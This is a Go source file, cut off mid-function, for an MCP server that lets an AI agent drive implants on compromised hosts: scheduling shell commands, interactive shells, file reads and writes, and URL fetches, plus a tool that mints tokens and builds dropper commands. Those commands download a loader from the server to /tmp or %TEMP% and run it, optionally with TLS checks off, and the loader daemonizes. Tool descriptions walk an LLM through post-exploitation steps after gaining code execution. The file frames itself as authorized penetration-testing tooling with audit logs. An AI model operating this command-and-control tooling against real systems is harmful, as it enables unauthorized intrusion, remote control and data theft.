// Copyright 2026 Davide Guerri <davide.guerri@gmail.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package mcp

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/dguerri/oast-mcp/internal/auth"
	"github.com/dguerri/oast-mcp/internal/store"
	"github.com/google/uuid"
	mcpgo "github.com/mark3labs/mcp-go/mcp"
	mcpserver "github.com/mark3labs/mcp-go/server"
)

// registerAgentTools registers all agent management tools with the MCP server.
func (s *Server) registerAgentTools() {
	listTool := mcpgo.NewTool("agent_list",
		mcpgo.WithDescription("List agents registered for the current tenant. "+
			"By default, agents whose token has expired are hidden. "+
			"Pass show_expired=true to include them. "+
			"Returns agent_id, status ('online'/'offline'), capabilities, expires_at, and last_seen_at."),
		mcpgo.WithBoolean("show_expired", mcpgo.Description("Include agents whose token has expired (default: false)")),
	)

	scheduleTool := mcpgo.NewTool("agent_task_schedule",
		mcpgo.WithDescription("Schedule a task on a registered agent during an authorized penetration test. Tasks are async — poll agent_task_status until status is 'done' or 'error'.\n\n"+
			"Available capabilities and their params:\n"+
			"  exec             — run a shell command. params: {\"cmd\": \"<shell command>\"}\n"+
			"  interactive_exec — start an interactive process (PTY on Unix). params: {\"command\": \"<shell command>\", \"binary\": false}\n"+
			"                     Use agent_task_interact to send stdin and read stdout/stderr.\n"+
			"  read_file        — read a file and return base64-encoded content. params: {\"path\": \"<absolute path>\"}\n"+
			"  write_file       — write a file from base64-encoded content. params: {\"path\": \"<absolute path>\", \"content_b64\": \"<base64 data>\", \"mode\": \"0644\"}\n"+
			"  fetch_url        — make an HTTP GET request. params: {\"url\": \"<url>\"}\n"+
			"  system_info      — return hostname, OS, arch, current user. params: {} (none required)\n\n"+
			"The timeout_secs parameter controls the overall task deadline (default 600 s = 10 min). "+
			"The agent enforces this deadline locally, killing any subprocess when it fires. "+
			"Use agent_task_cancel to abort a pending or running task early.\n\n"+
			"The returned task_id is used to poll agent_task_status for the result."),
		mcpgo.WithString("agent_id", mcpgo.Required(), mcpgo.Description("The agent ID to schedule the task for")),
		mcpgo.WithString("capability", mcpgo.Required(), mcpgo.Description("One of: exec, interactive_exec, read_file, write_file, fetch_url, system_info")),
		mcpgo.WithObject("params", mcpgo.Description("Parameters for the capability (see tool description for schema per capability)")),
		mcpgo.WithNumber("timeout_secs", mcpgo.Description(fmt.Sprintf(
			"Task execution timeout in seconds (default %d, max 86400). "+
				"This is the deadline for the agent to finish the task — not the wait timeout in agent_task_status.",
			store.DefaultTaskTimeoutSecs))),
	)

	statusTool := mcpgo.NewTool("agent_task_status",
		mcpgo.WithDescription("Get the status and result of a scheduled agent task. "+
			"Status progresses: pending → running → done | error.\n\n"+
			"By default (wait=true), this tool blocks server-side until the task reaches a terminal state "+
			"('done' or 'error') or the wait timeout elapses — no polling needed. "+
			"The response includes timed_out=true if the wait timeout fired before the task completed. "+
			"If the task is already in a terminal state, the tool returns immediately regardless of wait.\n\n"+
			"Set wait=false to get the current status instantly without blocking. "+
			"Use wait=false when you need to check multiple tasks in parallel, when you want to show "+
			"intermediate progress to the user, or when you have other work to do between checks.\n\n"+
			"timeout_secs controls how long this tool call blocks (default 30, max 120). "+
			"This is the *wait timeout* — it only affects how long this status query blocks. "+
			"It is independent of the *task timeout* set in agent_task_schedule, which controls "+
			"how long the agent has to finish the task overall.\n\n"+
			"On success, 'result' contains the capability output (e.g. exec: {output, exit_code}; "+
			"read_file: {content, path} base64-encoded; fetch_url: {status, body} base64-encoded). "+
			"On error, 'error' contains the error message."),
		mcpgo.WithString("task_id", mcpgo.Required(), mcpgo.Description("The task ID to check")),
		mcpgo.WithBoolean("wait", mcpgo.Description(
			"Block until the task completes or the wait timeout elapses (default: true). "+
				"Set to false to return the current status immediately without blocking.")),
		mcpgo.WithNumber("timeout_secs", mcpgo.Description(
			"Wait timeout in seconds (default 30, max 120). Only applies when wait=true. "+
				"This controls how long this status call blocks — not the task's execution deadline.")),
	)

	cancelTool := mcpgo.NewTool("agent_task_cancel",
		mcpgo.WithDescription("Cancel a pending or running agent task. "+
			"Transitions the task to status 'error' with error 'cancelled'. "+
			"If the agent is currently connected, a cancel signal is forwarded immediately so the agent can kill the running subprocess. "+
			"Returns an error if the task does not exist or is already in a terminal state (done/error)."),
		mcpgo.WithString("task_id", mcpgo.Required(), mcpgo.Description("The task ID to cancel")),
		mcpgo.WithString("agent_id", mcpgo.Required(), mcpgo.Description("The agent ID that owns the task (needed to route the cancel signal)")),
	)

	interactTool := mcpgo.NewTool("agent_task_interact",
		mcpgo.WithDescription(
			"Send input to and read output from a running interactive_exec task.\n\n"+
				"When an interactive_exec task is scheduled, the agent starts the process under a PTY "+
				"(Unix) or pipes (Windows). Use this tool to exchange data with the running process.\n\n"+
				"Workflow:\n"+
				"  1. Schedule: agent_task_schedule(capability=\"interactive_exec\", params={\"command\": \"...\"})\n"+
				"  2. Read initial output: agent_task_interact(task_id=...) — no stdin, just drain startup output\n"+
				"  3. Send input + read response: agent_task_interact(task_id=..., stdin=\"yes\\n\")\n"+
				"  4. Repeat until the process exits (running=false in the response)\n\n"+
				"C-style escape sequences in stdin are interpreted before sending:\n"+
				"  \\n = newline, \\r = carriage return, \\t = tab, \\\\ = literal backslash,\n"+
				"  \\xNN = hex byte (e.g. \\x03 = Ctrl-C, \\x04 = Ctrl-D, \\x1b = Escape).\n"+
				"By default, stdout/stderr are returned as UTF-8 text. Set binary=true to use "+
				"base64 encoding for both directions (e.g. when the process emits raw binary).\n\n"+
				"If wait=true (default) and no output is available yet, the call blocks server-side "+
				"until output arrives or timeout_secs elapses — no polling loop needed.\n\n"+
				"Returns {stdout, stderr, running, exit_code}. exit_code is present only when running=false."),
		mcpgo.WithString("task_id", mcpgo.Required(), mcpgo.Description("The task ID of the interactive_exec task")),
		mcpgo.WithString("stdin", mcpgo.Description(
			"Data to write to the process stdin. C-style escapes are interpreted: "+
				"\\n (newline), \\r (CR), \\t (tab), \\\\ (backslash), \\xNN (hex byte, e.g. \\x03 for Ctrl-C)")),
		mcpgo.WithBoolean("binary", mcpgo.Description(
			"When true, stdin is expected as base64 and stdout/stderr are returned as base64 (default: false)")),
		mcpgo.WithBoolean("wait", mcpgo.Description(
			"Block until output is available or timeout elapses (default: true)")),
		mcpgo.WithNumber("timeout_secs", mcpgo.Description(
			"Wait timeout in seconds (default 30, max 120). Only applies when wait=true.")),
	)

	s.mcp.AddTool(listTool, s.handleAgentList)
	s.mcp.AddTool(scheduleTool, s.handleAgentTaskSchedule)
	s.mcp.AddTool(statusTool, s.handleAgentTaskStatus)
	s.mcp.AddTool(cancelTool, s.handleAgentTaskCancel)
	s.mcp.AddTool(interactTool, s.handleAgentTaskInteract)

	targets := scanLoaderTargets(s.binDir)
	targetList := strings.Join(targets, ", ")
	if targetList == "" {
		targetList = "(none — run 'make build-loaders' on the server)"
	}
	dropperDesc := fmt.Sprintf(
		"Mint an agent token and generate delivery commands for a two-stage agent. "+
			"Used during authorized penetration tests to establish a managed agent on a target "+
			"where the operator has confirmed access. All tokens are scoped, time-limited, "+
			"and recorded in the audit log.\n\n"+
			"Stage 1 (loader) is tiny (~77KB for Linux, ~1.8MB for Windows) — deliver via URL or inline base64.\n"+
			"Stage 1 daemonizes immediately (the dropper command returns right away) and then downloads "+
			"Stage 2 (the full agent) over authenticated HTTPS in the background before exec-ing it.\n\n"+
			"IMPORTANT: because the loader daemonizes, the dropper command exits before the agent is online. "+
			"The agent typically appears within a few seconds, but it may take longer on slow connections. "+
			"After running the dropper, wait a moment and then poll agent_list until the agent shows 'online'.\n\n"+
			"Delivery modes (choose based on target environment):\n"+
			"  url    — target fetches loader over HTTPS. Returns curl_cmd, wget_cmd, python3_cmd in fallback order.\n"+
			"  inline — loader embedded as base64; no outbound HTTP needed. Returns b64_cmd and python3_b64_cmd fallback.\n\n"+
			"IMPORTANT — not all tools are installed on every target. Try commands in order until one succeeds:\n"+
			"  Linux url:    curl_cmd → wget_cmd → python3_cmd\n"+
			"  Linux inline: b64_cmd  → python3_b64_cmd\n"+
			"  Windows url:  curl_cmd (curl.exe is built-in since Win10 1803)\n"+
			"  Windows inline: b64_cmd (pure PowerShell, no external tools needed)\n"+
			"If a command fails with 'command not found' / 'not recognized', move to the next fallback immediately.\n\n"+
			"Loader flags (set via insecure parameter or added manually to the command):\n"+
			"  -k  Skip TLS certificate verification. Use ONLY when the target lacks a CA bundle (e.g. minimal containers).\n"+
			"      The flag is propagated to the Stage 2 agent so its WebSocket also skips verification.\n"+
			"  -f  Stay in foreground (do not daemonize). Useful for debugging — errors are printed to stderr.\n\n"+
			"Workflow after achieving code execution on an authorized target:\n"+
			"  1. Probe target OS/arch: uname -m (Linux) or $ENV:PROCESSOR_ARCHITECTURE (Windows).\n"+
			"  2. Call agent_dropper_generate with agent_id, os_arch, ttl, and delivery mode.\n"+
			"  3. Try each command in the fallback chain until one succeeds (the command returns immediately).\n"+
			"  4. Wait a few seconds, then call agent_list to confirm the agent appears as 'online'.\n"+
			"     If the agent does not appear, retry with -f added to the loader command to see errors.\n"+
			"  5. Use agent_task_schedule to run capabilities (exec, read_file, fetch_url, system_info).\n\n"+
			"Available targets: %s", targetList)

	dropperTool := mcpgo.NewTool("agent_dropper_generate",
		mcpgo.WithDescription(dropperDesc),
		mcpgo.WithString("agent_id", mcpgo.Required(),
			mcpgo.Description("Meaningful name for the agent, e.g. 'web-01'")),
		mcpgo.WithString("os_arch", mcpgo.Required(),
			mcpgo.Description("Target OS and architecture. One of: "+targetList)),
		mcpgo.WithString("ttl", mcpgo.Required(),
			mcpgo.Description("Token lifetime in Go duration format, e.g. '2h', '24h', '168h'")),
		mcpgo.WithString("delivery",
			mcpgo.Description("Delivery mode: 'url' (default) returns curl/wget commands; 'inline' embeds the loader as base64 for air-gapped targets")),
		mcpgo.WithBoolean("insecure",
			mcpgo.Description("Skip TLS certificate verification (loader -k flag). "+
				"Use ONLY when the target has no CA bundle (e.g. minimal containers). "+
				"The flag is propagated to the agent so its WebSocket connection also skips verification.")),
	)
	s.mcp.AddTool(dropperTool, s.handleAgentDropperGenerate)
}

// agentHandlers returns the handler map for agent tools, used by CallTool.
func (s *Server) agentHandlers() map[string]mcpserver.ToolHandlerFunc {
	return map[string]mcpserver.ToolHandlerFunc{
		"agent_list":             s.handleAgentList,
		"agent_task_schedule":    s.handleAgentTaskSchedule,
		"agent_task_status":      s.handleAgentTaskStatus,
		"agent_task_cancel":      s.handleAgentTaskCancel,
		"agent_task_interact":    s.handleAgentTaskInteract,
		"agent_dropper_generate": s.handleAgentDropperGenerate,
	}
}

// handleAgentList handles the agent_list tool call.
func (s *Server) handleAgentList(ctx context.Context, req mcpgo.CallToolRequest) (*mcpgo.CallToolResult, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "agent:admin"); err != nil {
		s.audit.Log(s.newAuditEvent(ctx, "agent.list", "denied"))
		return toolError("insufficient scope: agent:admin required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	showExpired := req.GetBool("show_expired", false)

	agents, err := s.store.ListAgents(ctx, claims.TenantID, showExpired)
	if err != nil {
		s.logger.Error("failed to list agents", "error", err)
		return toolError("failed to list agents: " + err.Error())
	}

	s.audit.Log(s.newAuditEvent(ctx, "agent.list", "ok"))

	type agentView struct {
		AgentID      string   `json:"agent_id"`
		TenantID     string   `json:"tenant_id"`
		Name         string   `json:"name"`
		Status       string   `json:"status"`
		Capabilities []string `json:"capabilities"`
		Insecure     bool     `json:"insecure"`
		RegisteredAt string   `json:"registered_at"`
		LastSeenAt   *string  `json:"last_seen_at,omitempty"`
		ExpiresAt    *string  `json:"expires_at,omitempty"`
	}

	views := make([]agentView, 0, len(agents))
	for _, a := range agents {
		v := agentView{
			AgentID:      a.AgentID,
			TenantID:     a.TenantID,
			Name:         a.Name,
			Status:       a.Status,
			Capabilities: a.Capabilities,
			Insecure:     a.Insecure,
			RegisteredAt: a.RegisteredAt.Format(time.RFC3339),
		}
		if a.LastSeenAt != nil {
			ls := a.LastSeenAt.Format(time.RFC3339)
			v.LastSeenAt = &ls
		}
		if a.ExpiresAt != nil {
			ea := a.ExpiresAt.Format(time.RFC3339)
			v.ExpiresAt = &ea
		}
		views = append(views, v)
	}
	return toolJSON(views)
}

// handleAgentTaskSchedule handles the agent_task_schedule tool call.
func (s *Server) handleAgentTaskSchedule(ctx context.Context, req mcpgo.CallToolRequest) (*mcpgo.CallToolResult, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "agent:admin"); err != nil {
		s.audit.Log(s.newAuditEvent(ctx, "agent.task.schedule", "denied"))
		return toolError("insufficient scope: agent:admin required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	agentID := req.GetString("agent_id", "")
	if agentID == "" {
		return toolError("agent_id is required")
	}
	capability := req.GetString("capability", "")
	if capability == "" {
		return toolError("capability is required")
	}

	var params map[string]any
	if args := req.GetArguments(); args != nil {
		if p, ok := args["params"]; ok {
			params, _ = p.(map[string]any)
		}
	}

	if _, err := s.store.GetAgent(ctx, agentID, claims.TenantID); err != nil {
		if errors.Is(err, store.ErrNotFound) {
			return toolError("agent not found")
		}
		s.logger.Error("failed to get agent", "error", err)
		return toolError("failed to get agent")
	}

	timeoutSecs, errMsg := parseTimeoutSecs(req.GetArguments())
	if errMsg != "" {
		return toolError(errMsg)
	}

	taskID := uuid.New().String()
	now := time.Now().UTC()
	timeoutAt := now.Add(time.Duration(timeoutSecs) * time.Second)
	task := &store.Task{
		TaskID:      taskID,
		AgentID:     agentID,
		TenantID:    claims.TenantID,
		ScheduledBy: claims.Subject,
		Capability:  capability,
		Params:      params,
		Status:      "pending",
		CreatedAt:   now,
		TimeoutSecs: timeoutSecs,
		TimeoutAt:   &timeoutAt,
	}
	if err := s.store.EnqueueTask(ctx, task); err != nil {
		s.logger.Error("failed to enqueue task", "error", err)
		return toolError("failed to schedule task: " + err.Error())
	}

	ev := s.newAuditEvent(ctx, "agent.task.schedule", "ok")
	ev.Resource = taskID
	s.audit.Log(ev)

	return toolJSON(map[string]any{
		"task_id":      taskID,
		"agent_id":     agentID,
		"capability":   capability,
		"status":       "pending",
		"timeout_secs": timeoutSecs,
		"timeout_at":   timeoutAt.Format(time.RFC3339),
		"created_at":   now.Format(time.RFC3339),
	})
}

// handleAgentTaskCancel handles the agent_task_cancel tool call.
func (s *Server) handleAgentTaskCancel(ctx context.Context, req mcpgo.CallToolRequest) (*mcpgo.CallToolResult, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "agent:admin"); err != nil {
		s.audit.Log(s.newAuditEvent(ctx, "agent.task.cancel", "denied"))
		return toolError("insufficient scope: agent:admin required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	taskID := req.GetString("task_id", "")
	if taskID == "" {
		return toolError("task_id is required")
	}
	agentID := req.GetString("agent_id", "")
	if agentID == "" {
		return toolError("agent_id is required")
	}

	if _, err := s.store.GetTask(ctx, taskID, claims.TenantID); err != nil {
		if errors.Is(err, store.ErrNotFound) {
			return toolError("task not found")
		}
		s.logger.Error("failed to get task for cancel", "error", err)
		return toolError("failed to get task")
	}

	// Fall back to store-only cancel when no agent server is configured.
	if s.agentSrv != nil {
		if err := s.agentSrv.SendCancel(ctx, taskID, agentID, claims.TenantID); err != nil {
			if errors.Is(err, store.ErrNotFound) {
				return toolError("task is already in a terminal state")
			}
			s.logger.Error("failed to cancel task", "error", err)
			return toolError("failed to cancel task")
		}
	} else {
		if err := s.store.CancelTask(ctx, taskID, claims.TenantID); err != nil {
			if errors.Is(err, store.ErrNotFound) {
				return toolError("task is already in a terminal state")
			}
			s.logger.Error("failed to cancel task", "error", err)
			return toolError("failed to cancel task")
		}
	}

	ev := s.newAuditEvent(ctx, "agent.task.cancel", "ok")
	ev.Resource = taskID
	s.audit.Log(ev)

	return toolJSON(map[string]any{
		"task_id":  taskID,
		"agent_id": agentID,
		"status":   "cancelled",
	})
}

// handleAgentTaskInteract handles the agent_task_interact tool call.
func (s *Server) handleAgentTaskInteract(ctx context.Context, req mcpgo.CallToolRequest) (*mcpgo.CallToolResult, error) {
	claims, task, errResult, err := s.validateInteractRequest(ctx, req)
	if err != nil {
		return nil, err
	}
	if errResult != nil {
		return errResult, nil
	}

	taskID := task.TaskID

	// Send stdin if provided (interpret C-style escapes).
	stdinData := req.GetString("stdin", "")
	if stdinData != "" {
		stdinData = unescapeStdin(stdinData)
		if err := s.agentSrv.SendStdin(taskID, task.AgentID, claims.TenantID, stdinData); err != nil {
			return toolError("failed to send stdin: " + err.Error())
		}
	}

	// Get the interactive buffer.
	buf := s.agentSrv.GetInteractiveBuf(taskID, task.AgentID, claims.TenantID)
	if buf == nil {
		// Task may have already completed or agent disconnected.
		if isTerminalStatus(task.Status) {
			return toolJSON(map[string]any{
				"stdout":  "",
				"stderr":  "",
				"running": false,
				"error":   task.Err,
			})
		}
		return toolError("interactive buffer not found — agent may have disconnected")
	}

	wait, waitTimeout := parseWaitParams(req)
	deadline := time.Now().Add(time.Duration(waitTimeout) * time.Second)

	stdout, stderr, done, exitCode, errMsg := buf.Drain(wait, deadline)

	ev := s.newAuditEvent(ctx, "agent.task.interact", "ok")
	ev.Resource = taskID
	s.audit.Log(ev)

	resp := map[string]any{
		"stdout":  stdout,
		"stderr":  stderr,
		"running": !done,
	}
	if done && exitCode != nil {
		resp["exit_code"] = *exitCode
	}
	if done && errMsg != "" {
		resp["error"] = errMsg
	}
	return toolJSON(resp)
}

// validateInteractRequest performs auth, rate-limit, and task validation for
// agent_task_interact. Returns (claims, task, nil, nil) on success, or
// (nil, nil, errorResult, nil) for tool-level errors.
func (s *Server) validateInteractRequest(ctx context.Context, req mcpgo.CallToolRequest) (*auth.Claims, *store.Task, *mcpgo.CallToolResult, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		r, _ := toolError("unauthorized")
		return nil, nil, r, nil
	}
	if err := auth.RequireScope(claims, "agent:admin"); err != nil {
		s.audit.Log(s.newAuditEvent(ctx, "agent.task.interact", "denied"))
		r, _ := toolError("insufficient scope: agent:admin required")
		return nil, nil, r, nil
	}
	if !s.rl.Allow(claims.TenantID) {
		r, _ := toolError("rate limit exceeded")
		return nil, nil, r, nil
	}

	taskID := req.GetString("task_id", "")
	if taskID == "" {
		r, _ := toolError("task_id is required")
		return nil, nil, r, nil
	}

	task, err := s.store.GetTask(ctx, taskID, claims.TenantID)
	if err != nil {
		if errors.Is(err, store.ErrNotFound) {
			r, _ := toolError("task not found")
			return nil, nil, r, nil
		}
		s.logger.Error("failed to get task", "error", err)
		r, _ := toolError("failed to get task")
		return nil, nil, r, nil
	}

	if task.Capability != "interactive_exec" {
		r, _ := toolError("task is not interactive — use agent_task_status instead")
		return nil, nil, r, nil
	}

	if s.agentSrv == nil {
		r, _ := toolError("agent server not configured")
		return nil, nil, r, nil
	}

	return claims, task, nil, nil
}

const (
	defaultWaitTimeoutSecs = 30
	maxWaitTimeoutSecs     = 120
	waitPollInterval       = 500 * time.Millisecond
)

// parseWaitParams extracts the wait (bool) and timeout_secs (int) parameters
// from the tool request. Returns (wait, timeoutSecs).
func parseWaitParams(req mcpgo.CallToolRequest) (bool, int) {
	wait := req.GetBool("wait", true)

	timeout := req.GetInt("timeout_secs", defaultWaitTimeoutSecs)
	if timeout < 1 {
		timeout = 1
	}
	if timeout > maxWaitTimeoutSecs {
		timeout = maxWaitTimeoutSecs
	}
	return wait, timeout
}

// unescapeStdin interprets C-style escape sequences in s so that LLMs can
// write e.g. "id\n" and have it arrive as a real newline.
// Supported: \n \r \t \a \b \\ \xNN.
func unescapeStdin(s string) string {
	var buf strings.Builder
	buf.Grow(len(s))
	for i := 0; i < len(s); i++ {
		if s[i] != '\\' || i+1 >= len(s) {
			buf.WriteByte(s[i])
			continue
		}
		switch s[i+1] {
		case 'n':
			buf.WriteByte('\n')
			i++
		case 'r':
			buf.WriteByte('\r')
			i++
		case 't':
			buf.WriteByte('\t')
			i++
		case 'a':
			buf.WriteByte('\a')
			i++
		case 'b':
			buf.WriteByte('\b')
			i++
		case '\\':
			buf.WriteByte('\\')
			i++
		case 'x':
			if i+3 < len(s) {
				if val, err := strconv.ParseUint(s[i+2:i+4], 16, 8); err == nil {
					buf.WriteByte(byte(val))
					i += 3
				} else {
					buf.WriteByte('\\')
				}
			} else {
				buf.WriteByte('\\')
			}
		default:
			buf.WriteByte('\\')
		}
	}
	return buf.String()
}

// handleAgentTaskStatus handles the agent_task_status tool call.
func (s *Server) handleAgentTaskStatus(ctx context.Context, req mcpgo.CallToolRequest) (*mcpgo.CallToolResult, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "agent:admin"); err != nil {
		s.audit.Log(s.newAuditEvent(ctx, "agent.task.status", "denied"))
		return toolError("insufficient scope: agent:admin required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	taskID := req.GetString("task_id", "")
	if taskID == "" {
		return toolError("task_id is required")
	}

	wait, waitTimeout := parseWaitParams(req)

	task, err := s.store.GetTask(ctx, taskID, claims.TenantID)
	if err != nil {
		if errors.Is(err, store.ErrNotFound) {
			return toolError("task not found")
		}
		s.logger.Error("failed to get task", "error", err)
		return toolError("failed to get task")
	}

	timedOut := false
	if wait && !isTerminalStatus(task.Status) {
		task, timedOut, err = s.pollUntilTaskDone(ctx, taskID, claims.TenantID, time.Now().Add(time.Duration(waitTimeout)*time.Second))
		if err != nil {
			s.logger.Error("failed to poll task", "error", err)
			return toolError("failed to poll task")
		}
	}

	ev := s.newAuditEvent(ctx, "agent.task.status", "ok")
	ev.Resource = taskID
	s.audit.Log(ev)

	type taskView struct {
		TaskID      string         `json:"task_id"`
		AgentID     string         `json:"agent_id"`
		Capability  string         `json:"capability"`
		Status      string         `json:"status"`
		CreatedAt   string         `json:"created_at"`
		StartedAt   *string        `json:"started_at,omitempty"`
		CompletedAt *string        `json:"completed_at,omitempty"`
		Result      map[string]any `json:"result,omitempty"`
		Err         string         `json:"error,omitempty"`
		TimedOut    *bool          `json:"timed_out,omitempty"`
	}

	v := taskView{
		TaskID:     task.TaskID,
		AgentID:    task.AgentID,
		Capability: task.Capability,
		Status:     task.Status,
		CreatedAt:  task.CreatedAt.Format(time.RFC3339),
		Result:     task.Result,
		Err:        task.Err,
	}
	if wait {
		v.TimedOut = &timedOut
	}
	if task.StartedAt != nil {
		sa := task.StartedAt.Format(time.RFC3339)
		v.StartedAt = &sa
	}
	if task.CompletedAt != nil {
		ca := task.CompletedAt.Format(time.RFC3339)
		v.CompletedAt = &ca
	}
	return toolJSON(v)
}

// isTerminalStatus returns true if the task status is a terminal state.
func isTerminalStatus(status string) bool {
	return status == "done" || status == "error"
}

// pollUntilTaskDone polls the store every 500ms until the task reaches a
// terminal state, the deadline elapses, or the context is cancelled.
func (s *Server) pollUntilTaskDone(ctx context.Context, taskID, tenantID string, deadline time.Time) (*store.Task, bool, error) {
	ticker := time.NewTicker(waitPollInterval)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			// Context cancelled — return last known state.
			task, err := s.store.GetTask(ctx, taskID, tenantID)
			if err != nil {
				return nil, false, err
			}
			return task, true, nil
		case <-ticker.C:
			task, err := s.store.GetTask(ctx, taskID, tenantID)
			if err != nil {
				return nil, false, err
			}
			if isTerminalStatus(task.Status) {
				return task, false, nil
			}
			if !time.Now().Before(deadline) {
				return task, true, nil
			}
		}
	}
}

// handleAgentDropperGenerate handles the agent_dropper_generate tool call.
func (s *Server) handleAgentDropperGenerate(ctx context.Context, req mcpgo.CallToolRequest) (*mcpgo.CallToolResult, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "agent:admin"); err != nil {
		s.audit.Log(s.newAuditEvent(ctx, "agent.dropper.generate", "denied"))
		return toolError("insufficient scope: agent:admin required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	agentID := req.GetString("agent_id", "")
	osArch := req.GetString("os_arch", "")
	ttlStr := req.GetString("ttl", "")
	delivery := req.GetString("delivery", "url")
	insecureTLS := req.GetBool("insecure", false)

	ttl, errMsg := parseDropperParams(agentID, osArch, ttlStr, delivery)
	if errMsg != "" {
		return toolError(errMsg)
	}

	loaderName := loaderNameForArch(osArch)
	loaderBytes, err := os.ReadFile(filepath.Join(s.binDir, loaderName))
	if err != nil {
		return toolError("no loader available for os_arch: " + osArch +
			" (run 'make build-loaders' on the server)")
	}

	// The JWT embeds both tenantID and agentID; the agent server treats
	// these claims as the sole source of identity.
	token, err := s.auth.IssueAgent(claims.TenantID, agentID, []string{"agent:connect"}, ttl)
	if err != nil {
		s.logger.Error("failed to mint agent token", "err", err)
		return toolError("failed to mint token")
	}

	expiresAt := time.Now().Add(ttl).UTC()
	loaderB64 := base64.StdEncoding.EncodeToString(loaderBytes)
	downloadURL := s.agentBaseURL + "/dl/" + loaderName
	loaderFlags := ""
	if insecureTLS {
		loaderFlags = "-k "
	}
	launchArgs := fmt.Sprintf("%s%s %s %s", loaderFlags, s.agentBaseURL, token, agentID)

	cmds := buildDropperCmds(osArch, downloadURL, loaderB64, launchArgs, insecureTLS)

	ev := s.newAuditEvent(ctx, "agent.dropper.generate", "ok")
	ev.Resource = agentID
	ev.Detail = map[string]any{"os_arch": osArch, "delivery": delivery, "insecure": insecureTLS}
	s.audit.Log(ev)

	result := map[string]any{
		"agent_id":   agentID,
		"os_arch":    osArch,
		"token":      token,
		"expires_at": expiresAt.Format(time.RFC3339),
		"server_url": s.agentBaseURL,
		"delivery":   delivery,
	}
	if delivery == "url" {
		result["download_url"] = downloadURL
		result["curl_cmd"] = cmds.curlCmd
		if cmds.wgetCmd != "" {
			result["wget_cmd"] = cmds.wgetCmd
		}
		if cmds.python3Cmd != "" {
			result["python3_cmd"] = cmds.python3Cmd
		}
	} else {
		result["b64_cmd"] = cmds.b64Cmd
		if cmds.python3B64Cmd != "" {
			result["python3_b64_cmd"] = cmds.python3B64Cmd
		}
	}
	return toolJSON(result)
}

// parseTimeoutSecs extracts and validates timeout_secs from tool arguments.
// Returns DefaultTaskTimeoutSecs when not set, or a non-empty error string on failure.
func parseTimeoutSecs(args map[string]any) (int, string) {
	if args == nil {
		return store.DefaultTaskTimeoutSecs, ""
	}
	v, ok := args["timeout_secs"]
	if !ok {
		return store.DefaultTaskTimeoutSecs, ""
	}
	f, ok := v.(float64)
	if !ok || f <= 0 {
		return store.DefaultTaskTimeoutSecs, ""
	}
	secs := int(f)
	if secs > 86400 {
		return 0, "timeout_secs must not exceed 86400 (24 hours)"
	}
	return secs, ""
}

// parseDropperParams validates agent dropper parameters and returns the parsed TTL.
// Returns a non-empty error message string on failure.
func parseDropperParams(agentID, osArch, ttlStr, delivery string) (time.Duration, string) {
	if agentID == "" || osArch == "" || ttlStr == "" {
		return 0, "agent_id, os_arch, and ttl are all required"
	}
	if delivery != "url" && delivery != "inline" {
		return 0, "delivery must be 'url' or 'inline'"
	}
	ttl, err := time.ParseDuration(ttlStr)
	if err != nil || ttl <= 0 {
		return 0, "invalid ttl: use Go duration format e.g. '2h', '24h'"
	}
	if ttl > 168*time.Hour {
		return 0, "ttl must not exceed 168h (7 days)"
	}
	return ttl, ""
}

// loaderNameForArch returns the loader binary filename for the given os/arch pair.
func loaderNameForArch(osArch string) string {
	name := "loader-" + osArch
	if strings.HasPrefix(osArch, "windows-") {
		name += ".exe"
	}
	return name
}

type dropperCmds struct {
	curlCmd       string
	wgetCmd       string
	python3Cmd    string
	b64Cmd        string
	python3B64Cmd string
}

func buildDropperCmds(osArch, downloadURL, loaderB64, launchArgs string, insecure bool) dropperCmds {
	// When insecure, add -k to curl and --no-check-certificate to wget so the
	// download tools also skip TLS verification (the loader -k flag only
	// affects Stage 2 download, not the Stage 1 fetch by curl/wget).
	curlFlag := "-fsSL"
	wgetFlag := "-qO"
	py3TLS := ""
	if insecure {
		curlFlag = "-fskSL"
		wgetFlag = "--no-check-certificate -qO"
		py3TLS = "import ssl; ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE; "
	}

	if strings.HasPrefix(osArch, "windows-") {
		return dropperCmds{
			curlCmd: fmt.Sprintf(
				`curl.exe %s "%s" -o "$env:TEMP\l.exe" && & "$env:TEMP\l.exe" %s`,
				curlFlag, downloadURL, launchArgs),
			b64Cmd: fmt.Sprintf(
				`[IO.File]::WriteAllBytes("$env:TEMP\l.exe",[Convert]::FromBase64String("%s")); & "$env:TEMP\l.exe" %s`,
				loaderB64, launchArgs),
		}
	}

	py3URLCmd := fmt.Sprintf(
		`python3 -c "%simport urllib.request,os; urllib.request.urlretrieve('%s','/tmp/.l'); os.chmod('/tmp/.l',0o700)" && /tmp/.l %s`,
		py3TLS, downloadURL, launchArgs)
	if insecure {
		py3URLCmd = fmt.Sprintf(
